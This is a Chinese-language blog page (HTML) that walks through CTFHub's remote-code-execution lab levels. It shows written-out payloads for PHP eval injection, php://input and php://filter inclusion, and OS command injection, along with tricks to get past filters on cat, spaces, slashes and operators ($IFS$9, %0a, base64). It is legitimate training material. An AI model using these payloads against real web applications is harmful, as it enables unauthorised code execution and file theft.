@@ -1,0 +1,169 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CTFHub-RCE | Yian's Blog</title><meta name="author" content="一安"><meta name="copyright" content="一安"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="eval执行从源代码来看，这里就是直接eval输出request请求的cmd命令那我们直接查看目录?cmd&#x3D;system(&quot;ls&quot;);这里并没有发现有用的东西，我们访问前一级目录，?cmd&#x3D;system(&quot;ls%20&#x2F;&quot;);发现flag_15266，?cmd&#x3D;system(&quot;cat%20&#x2F;flag_15266&quot;); 文件包含从源码发现这里">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFHub-RCE">
+<meta property="og:url" content="https://yian4243.github.io/2024/12/21/CTFHub-RCE/index.html">
+<meta property="og:site_name" content="Yian&#39;s Blog">
+<meta property="og:description" content="eval执行从源代码来看，这里就是直接eval输出request请求的cmd命令那我们直接查看目录?cmd&#x3D;system(&quot;ls&quot;);这里并没有发现有用的东西，我们访问前一级目录，?cmd&#x3D;system(&quot;ls%20&#x2F;&quot;);发现flag_15266，?cmd&#x3D;system(&quot;cat%20&#x2F;flag_15266&quot;); 文件包含从源码发现这里">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2024-12-21T07:14:31.000Z">
+<meta property="article:modified_time" content="2024-12-30T09:48:25.517Z">
+<meta property="article:author" content="一安">
+<meta property="article:tag" content="关键词">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yian4243.github.io/2024/12/21/CTFHub-RCE/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CTFHub-RCE',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-30 17:48:25'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Yian's Blog"><span class="site-name">Yian's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTFHub-RCE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-21T07:14:31.000Z" title="发表于 2024-12-21 15:14:31">2024-12-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-30T09:48:25.517Z" title="更新于 2024-12-30 17:48:25">2024-12-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CTFHub-RCE"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h3><p>从源代码来看，这里就是直接eval输出request请求的cmd命令<br><img src="/image/1221/1-1.png" alt="1-1"><br>那我们直接查看目录<code>?cmd=system(&quot;ls&quot;);</code><br><img src="/image/1221/1-2.png" alt="1-2"><br>这里并没有发现有用的东西，我们访问前一级目录，<code>?cmd=system(&quot;ls%20/&quot;);</code><br><img src="/image/1221/1-3.png" alt="1-3"><br>发现flag_15266，<code>?cmd=system(&quot;cat%20/flag_15266&quot;);</code><br><img src="/image/1221/1-4.png" alt="1-4"></p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>从源码发现这里有一个file参数，且这里有一个shell.txt。<br>strpos 函数返回查找到的子字符串的下标。如果字符串开头就是我们要搜索的目标，则返回下标 0 ；如果搜索不到，则返回 false 。在这道题目中，开发者只考虑到 strpos 函数返回 false 的情况，却忽略了匹配到的字符在首位时会返回 0 的情况，因为 false和 0 的取反均为 true 。 这样我们就可以在用户名和密码首字符注入 &lt; 符号，从而注入xml数据。<br><img src="/image/1221/2-1.png" alt="2-1"><br>那我们让file&#x3D;shell.txt<br><img src="/image/1221/2-2.png" alt="2-2"><br>点开链接发现shell内容，这里能够传入ctfhub参数的值<br><img src="/image/1221/2-3.png" alt="2-3"><br>用hackerbar编写ctfhub内容并传入，查看目录<br><img src="/image/1221/2-4.png" alt="2-4"><br>查看上一级目录<br><img src="/image/1221/2-5.png" alt="2-5"><br>输出flag值<br><img src="/image/1221/2-6.png" alt="2-6"></p>
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>从源码发现这里的file必须以<code>php://</code>开头，且这一关没有脚本可以使用。<br><img src="/image/1221/3-1.png" alt="3-1"><br>知识点 php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）<br>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流.<br>可以接收post请求作为输入流的输入，将请求作为PHP代码的输入传递给目标变量，以达到以post 的形式进行输入的目的。<br>这里通过burpsuite构造php代码，先查看目录<br><img src="/image/1221/3-2.png" alt="3-2"><br>查看上一级目录<br><img src="/image/1221/3-3.png" alt="3-3"><br>输出flag<br><img src="/image/1221/3-4.png" alt="3-4"></p>
+<h3 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h3><p><code>php://filter</code>的主要作用是提供一种机制，让您可以轻松地在数据流上应用一个或多个过滤器。<br>php:&#x2F;&#x2F;filter 的基本格式如下：<br><code>php://filter/read=?/resource=?</code><br>这关代码和上一关一样，但是不能使用<code>php://input</code>，由于题目提示flag in &#x2F;flag，我们将资源位置改成该位置，编码方式采用base64。<br>payload:<code>?file=php://filter/read=convert.base64-encode/resource=/flag</code><br>得到base64编码的flag<br><img src="/image/1221/4-1.png" alt="4-1"><br>通过hackbar的解码功能解码base64<br><img src="/image/1221/4-2.png" alt="4-2"></p>
+<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>从源代码看，我们不能通过文件路径直接访问flag<br><img src="/image/1221/5-1.png" alt="5-1"><br>这关可以直接采用php:&#x2F;&#x2F;input上传我们的php代码执行system命令。查看目录<code>&lt;?php system(&#39;ls&#39;)?&gt;</code><br><img src="/image/1221/5-2.png" alt="5-2"><br>查看上级目录<code>&lt;?php system(&#39;ls /&#39;)?&gt;</code><br><img src="/image/1221/5-3.png" alt="5-3"><br>输出flag<br><img src="/image/1221/5-4.png" alt="5-4"></p>
+<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>这里会根据输入的ip执行一定的命令，且无过滤。<br><img src="/image/1221/6-1.png" alt="6-1"><br>再linux中<code>;</code>,<code>||</code>,<code>&amp;&amp;</code>都可以用于分割多条命令<br><code>;</code>:各个命令都执行<br><code>||</code>:前一条执行失败才执行后一条<br><code>&amp;&amp;</code>:前一条执行成功才执行后一条<br>输入<code>ip;ls</code><br><img src="/image/1221/6-2.png" alt="6-2"><br>输入<code>ip;ls /</code>，并没有发现flag<br><img src="/image/1221/6-3.png" alt="6-3"><br>查找目录中的php文件，<code>;cat 1420527519584.php</code>，打不开<br><img src="/image/1221/6-4.png" alt="6-4"><br>应该是有特殊字符，使用base64加密输出，<code>;cat 1420527519584.php | base64</code><br><img src="/image/1221/6-5.png" alt="6-5"><br>hackbar解码<br><img src="/image/1221/6-6.png" alt="6-6"></p>
+<h3 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h3><p>这一关将cat过滤了，我们使用其他命令读取即可<br><img src="/image/1221/7-1.png" alt="7-1"><br>先查看目录，<code>;ls</code><br><img src="/image/1221/7-2.png" alt="7-2"><br>linux查看文本的命令<br><code>cat</code>:由第一行开始显示内容，并将所有内容输出<br><code>tac</code>:从最后一行倒序显示内容，并将所有内容输出<br><code>more</code>:根据窗口大小，一页一页的现实文件内容<br><code>less</code>:和more类似，但其优点可以往前翻页，而且进行可以搜索字符<br><code>head</code>:只显示头几行<br><code>tail</code>:只显示最后几行<br><code>nl</code>:类似于cat -n，显示时输出行号<br><code>tailf</code>:类似于tail -f<br>使用more查看flag文件,base64编码，并使用hackbar解码<br><img src="/image/1221/7-3.png" alt="7-3"></p>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>这里将空格过滤了，那我们考虑有什么方法不用空格还能执行命令的方法<br><img src="/image/1221/8-1.png" alt="8-1"><br>查看目录<br><img src="/image/1221/8-2.png" alt="8-2"><br>搜索查到绕过方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure>
+<p>我们使用<code>&lt;</code>替换空格，<code>;cat$IFS$9flag_325972945528.php|base64</code>，试了<code>&lt;</code>不知道为什么不行<br><img src="/image/1221/8-3.png" alt="8-3"></p>
+<h3 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h3><p>从代码来看，这里过滤了目录分隔符<code>/</code><br><img src="/image/1221/9-1.png" alt="9-1"><br>查看目录发现，flag再当前目录的文件夹里，但是我们不能使用<code>/</code>，想其他办法访问子文件夹<br><img src="/image/1221/9-2.png" alt="9-2"><br>我们可以cd命令改变当前文件夹，进入到子文件夹，再通过cat输出flag，即写三个命令。<br><code>;cd flag_is_here;cat flag_5807214223441.php|base64</code><br><img src="/image/1221/9-3.png" alt="9-3"></p>
+<h3 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h3><p>这关过滤了<code>|&amp;</code><br><img src="/image/1221/10-1.png" alt="10-1"><br>查看目录发现flag就在该目录下<br><img src="/image/1221/10-2.png" alt="10-2"><br><code>;cat flag_18969215614994.php|base64</code>含有管道符无法执行，搜索发现，可以直接<code>base64 flag.php</code>编码输出<br><code>;base64 flag_18969215614994.php</code><br><img src="/image/1221/10-3.png" alt="10-3"></p>
+<h3 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h3><p>这一关过滤了太多太多<code>| &amp; ; cat flag ctfhub 空格</code><br><img src="/image/1221/11-1.png" alt="11-1"><br>url中传给ip值，<code>?ip=110.242.68.66%0als#</code><br><img src="/image/1221/11-2.png" alt="11-2"><br>payload<code>?ip=110.242.68.66%0acd$IFS$9fla\g_is_here%0als#</code>，<code>%0a</code>替换分号，<code>$IFS$9</code>替换空格，<code>\</code>分开flag<br><img src="/image/1221/11-3.png" alt="11-3"><br>payload<code>?ip=110.242.68.66%0acd$IFS$9fla\g_is_here%0abase64$IFS$9fla\g_566967514602.php#</code><br><code>base64</code>替换<code>cat</code><br><img src="/image/1221/11-4.png" alt="11-4"><br>查找其他资料发现flag也可以用正则<code>f***</code>绕过</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://yian4243.github.io">一安</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://yian4243.github.io/2024/12/21/CTFHub-RCE/">https://yian4243.github.io/2024/12/21/CTFHub-RCE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yian4243.github.io" target="_blank">Yian's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/12/08/Xss-labs/" title="Xss-labs"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Xss-labs</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">一安</div><div class="author-info__description">描述</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#eval%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">eval执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-number">3.</span> <span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">4.</span> <span class="toc-text">读取源代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB"><span class="toc-number">5.</span> <span class="toc-text">远程包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4cat"><span class="toc-number">7.</span> <span class="toc-text">过滤cat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">8.</span> <span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-number">9.</span> <span class="toc-text">过滤目录分隔符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">10.</span> <span class="toc-text">过滤运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4%E7%BB%83%E4%B9%A0"><span class="toc-number">11.</span> <span class="toc-text">综合过滤练习</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/21/CTFHub-RCE/" title="CTFHub-RCE">CTFHub-RCE</a><time datetime="2024-12-21T07:14:31.000Z" title="发表于 2024-12-21 15:14:31">2024-12-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/08/Xss-labs/" title="Xss-labs">Xss-labs</a><time datetime="2024-12-08T08:22:13.000Z" title="发表于 2024-12-08 16:22:13">2024-12-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/07/Sqli-labs/" title="Sqli-labs">Sqli-labs</a><time datetime="2024-12-07T09:48:15.000Z" title="发表于 2024-12-07 17:48:15">2024-12-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/02/twcms/" title="twcms">twcms</a><time datetime="2024-11-02T09:44:38.000Z" title="发表于 2024-11-02 17:44:38">2024-11-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/23/TASK-2-upload-labs/" title="TASK 2-upload-labs">TASK 2-upload-labs</a><time datetime="2024-10-23T06:50:34.000Z" title="发表于 2024-10-23 14:50:34">2024-10-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 一安</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
